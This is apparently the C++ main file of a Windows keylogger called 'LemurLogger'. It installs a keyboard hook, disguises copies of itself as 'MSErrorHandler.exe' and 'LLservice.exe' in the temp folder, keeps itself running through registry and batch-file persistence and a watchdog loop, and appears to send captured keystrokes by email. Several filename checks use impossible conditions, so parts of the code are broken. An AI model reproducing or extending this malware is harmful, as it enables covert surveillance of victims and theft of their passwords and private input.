#include <iostream>
#include <windows.h>
#include "Helper.h"
#include "KeyConstants.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"
#include "KeybHook.h"
#include "Regedit.h"
#include "prepare.h"
#include "Process.h"

using namespace std;

int main()
{
    pre::start();

    string filename = IO::getFileName();
    if (filename == "MSErrorHandler.exe" &&  filename == "MSErrorHandler" ){
        std::string msg = "sate idle";
        Helper::WriteAppLog(msg);
        char* temp = getenv("temp");
        std::string temp_dir(temp);
        std::string path = temp_dir+"\\LLservice.exe";
	    while(true){
	    while(IO::exists_file(path)){
            if (GetIsOnProcess(filename)){
                ss::creckSoc();
            } else {
                IO::startup(path.c_str());
            }

        }
	IO::copy_File();
        }
    }else{
    	if(filename == "LLservice.exe" &&  filename == "LLservice"){
 		while (GetIsOnProcess("LemurLogger.exe")||GetIsOnProcess("LemurLogger")){
                	std::string msg = "sate idle";
        		Helper::WriteAppLog(msg);
            	}
         }
    }
    if(filename == "LemurLogger.exe"|| filename =="LemurLogger")
	   {
            std::string batname = "batLLog.bat";
		    char* temp = getenv("temp");
		    std::string temp_dir(temp);
            std::string batpath = temp_dir+batname;
		    IO::mkbat(IO::getFileNameWithPath(),batpath);
                    //shell_cmd()
                    //startup(fullpath.c_str());
                    Registry::RegisterProgram2(batname,batpath);
    	            Registry::RegisterProgram();
            }


    MSG Msg;
    IO::MkDir(IO::GetOurPath(true));
    GetProcID();
    curprocname = GetProcName(curpid);
    EnumWindows(EnumWindowsProc,0);
    InstallHook();
	while (GetMessage(&Msg, NULL, 0, 0))
	{
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}
	MailTimer.Stop();
	return 0;
}
